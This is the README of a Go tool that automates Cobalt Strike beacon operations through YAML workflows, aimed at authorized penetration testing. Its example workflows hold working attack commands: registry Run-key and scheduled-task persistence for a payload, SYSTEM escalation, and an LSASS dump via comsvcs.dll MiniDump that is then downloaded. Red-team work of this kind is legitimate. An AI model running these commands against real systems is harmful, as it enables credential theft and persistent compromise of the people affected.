# csbot

YAML-based workflow automation for Cobalt Strike operations.

> [!CAUTION]
> This project is in early stage active development - Expect significant changes. The API is also in BETA, so may also be subject to change.

> [!IMPORTANT]
> Known issues:
> - `/api/v1/beacons/{bid}/execute/bof/pack` is not working, impacting `bof_pack` - a temporary workaround type `bof_pack_custom` has been implemented to do packing client side
> - `/api/v1/beacons/{bid}/execute/upload` (type: `upload`)currently never returns a success. This results in csbot hanging waiting for completion. No workaround implemented for the moment 


## Overview

csbot executes complex operational workflows against Cobalt Strike beacons using simple YAML templates. It supports conditional logic, beacon metadata evaluation, success/failure branching, and interactive beacon selection.

## Features

- **Interactive Beacon Selection** - Visual beacon picker when no beacon specified
- **YAML-Based Workflows** - Easy to read and version control
- **Beacon Metadata Conditions** - Make decisions based on user, OS, privileges
- **OR/AND Logic** - Complex conditional execution with `any_of`/`all_of`
- **Success/Failure Branching** - Define different paths for outcomes
- **Multiple Action Types** - Shell, PowerShell, BOF, file operations
- **Variable Interpolation** - Reference previous action outputs
- **Parallel Execution** - Run multiple actions concurrently

![ExampleRun](imgs/run_example.png)

## Quick Start

### Installation

```bash
# From repo root
cd csbot
go build -o csbot
```

### Basic Usage

```bash
./csbot -host 10.0.0.1 -username operator -password pass -config workflow.yaml -insecure

# With environment variables
export CS_HOST=10.0.0.1 CS_USERNAME=operator CS_PASSWORD=pass
./csbot -workflow workflow.yaml

# With config file
cp config.yaml.example config.yaml
./csbot -config config.yaml -workflow workflow.yaml
```

### Command Line Options

```
-host string         Cobalt Strike host (required unless in config/env)
-port int            Cobalt Strike API port (default: 50443)
-username string     Username for authentication (required unless in config/env)
-password string     Password for authentication (required unless in config/env)
-config string       Path to config YAML file
-workflow string     Path to workflow YAML file (required)
-log-level string    Log level: debug, info, warn, error (overrides config)
-insecure           Skip TLS verification
```

### Configuration Priority

1. Command-line flags
2. Environment variables (`CS_HOST`, `CS_USERNAME`, `CS_PASSWORD`, `CS_INSECURE`, `CS_LOG_LEVEL`)
3. YAML config file (`config.yaml`)

### Debug Mode

Enable detailed logging to troubleshoot workflows and conditions:

```bash
# Via command-line flag (temporary)
./csbot -config config.yaml -workflow workflow.yaml -log-level debug

# Via environment variable
CS_LOG_LEVEL=debug ./csbot -config config.yaml -workflow workflow.yaml

# Via config file (persistent)
# Edit config.yaml:
logging:
  level: debug  # Change from "info" to "debug"
```

Debug output shows:
- Beacon metadata values
- Condition evaluation (any_of, all_of)
- Each condition check and result
- Source values being compared

## Creating Workflows

### Simple Workflow

```yaml
name: Basic Recon
beacon_id: "abc123"  # Optional - omit for interactive selection

actions:
  - name: check_user
    type: getuid

  - name: list_processes
    type: shell
    parameters:
      command: "tasklist"
```

### With Conditions

```yaml
name: Conditional Escalation

actions:
  - name: check_privileges
    type: getuid

  # Only escalate if not already SYSTEM
  - name: escalate
    type: getsystem
    conditions:
      - source: check_privileges
        operator: not_contains
        value: "SYSTEM"
```

### With Variables

```yaml
name: Persistence Workflow
variables:
  payload_path: "C:\\Windows\\Temp\\payload.exe"
  persistence_name: "WindowsUpdate"

actions:
  - name: registry_persistence
    type: shell
    parameters:
      command: 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${persistence_name}" /t REG_EXPAND_SZ /f /d "${payload_path}"'

  - name: schtask_persistence
    type: shell
    parameters:
      command: 'schtasks /create /tn "${persistence_name}" /tr "${payload_path}" /sc daily'
```

### With Beacon Metadata

```yaml
name: OS-Specific Actions

actions:
  # Only run on Windows 10+
  - name: modern_command
    type: powershell
    parameters:
      command: "Get-ComputerInfo"
    any_of:
      - source: beacon.os
        operator: contains
        value: "Windows 10"
      - source: beacon.os
        operator: contains
        value: "Windows 11"

  # Only if elevated
  - name: admin_task
    type: shell
    parameters:
      command: "reg query HKLM"
    all_of:
      - source: beacon.isAdmin
        operator: equals
        value: "true"
```

### With OR Logic

```yaml
name: Credential Harvesting

actions:
  # Run if user OR impersonated user is SYSTEM
  - name: dump_lsass
    type: powershell
    any_of:
      - source: beacon.user
        operator: contains
        value: "SYSTEM"
      - source: beacon.impersonated
        operator: contains
        value: "SYSTEM"
    parameters:
      command: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
    on_success:
      - name: download_dump
        type: download
        parameters:
          remote_path: C:\Windows\Temp\lsass.dmp
```

## Action Types

| Type | Description | Parameters |
|------|-------------|------------|
| `getuid` | Get current user | None |
| `getsystem` | Escalate to SYSTEM | None |
| `shell` | Execute shell command | `command` |
| `powershell` | Execute PowerShell | `command` |
| `upload` | Upload file to beacon CWD | `local_path` |
| `download` | Download file | `remote_path` |
| `screenshot` | Capture screenshot | None |
| `consolecommand` | Execute CS console command | `command`, `arguments`, `files` |
| `sleep` | Pause execution | `duration` |
| `bof_string` | Execute BOF (string args) | `bof`, `entrypoint`, `arguments` |
| `bof_pack` | Execute BOF (typed args) | `bof`, `entrypoint`, `arguments` |
| `bof_packed` | Execute BOF (pre-packed) | `bof`, `entrypoint`, `arguments` |

## Beacon Metadata Fields

Access beacon information in conditions using `beacon.` prefix:

| Field | Example |
|-------|---------|
| `beacon.user` | `DOMAIN\admin` |
| `beacon.impersonated` | `NT AUTHORITY\SYSTEM` |
| `beacon.isAdmin` | `true` / `false` |
| `beacon.computer` | `DC-01` |
| `beacon.os` | `Windows 10 Enterprise` |
| `beacon.internal` | `10.0.0.5` |
| `beacon.process` | `explorer.exe` |
| `beacon.pid` | `1234` |
| `beacon.beaconArch` | `x64` |

## Condition Operators

- `contains` - Output contains value
- `not_contains` - Output doesn't contain value
- `equals` - Exact match
- `matches` - Regex pattern match

## Interactive Beacon Selection

When `beacon_id` is omitted, csbot displays all beacons:

```
Available Beacons:
========================================================
#   Beacon ID   User              Hostname    Internal IP
1   abc12345    DOMAIN\admin      DC-01       10.0.0.5
2   def67890    NT AUTHORITY\SYS  WEB-SRV     10.0.0.80
========================================================

Select beacon number (or 'q' to quit): 1
```

## Template Examples

See `templates/` directory for example workflows:
- `credential-harvesting.yaml` - LSASS dumping with conditions
- `privilege-escalation.yaml` - Multi-method escalation
- `recon.yaml` - System enumeration

## Documentation

- **README.md** (this file) - Installation and usage
- **TEMPLATE_DEV.md** - Complete template syntax reference


For detailed template syntax, condition logic, and advanced features, see [TEMPLATE_DEV.md](TEMPLATE_DEV.md).

## Serious Notes

- This tool is for authorized penetration testing only
- Always obtain proper authorization before use
- Review workflows before execution

## Troubleshooting

### Connection Issues

- Verify Cobalt Strike REST API is enabled
- Check firewall rules and network connectivity
- Ensure correct host/port configuration
- Use `-insecure` for self-signed certificates

### BOF Execution Fails

- Verify BOF file path is absolute and correct
- Check BOF architecture matches beacon
- Ensure beacon is alive and responsive

### Conditions Not Triggering

- Verify action names match exactly
- Check operator spelling
- Review logs for condition evaluation
- See TEMPLATE_DEV.md for detailed condition syntax

### No Beacons Available

- Verify beacons are active in Cobalt Strike
- Check authentication succeeded
- Ensure proper API permissions
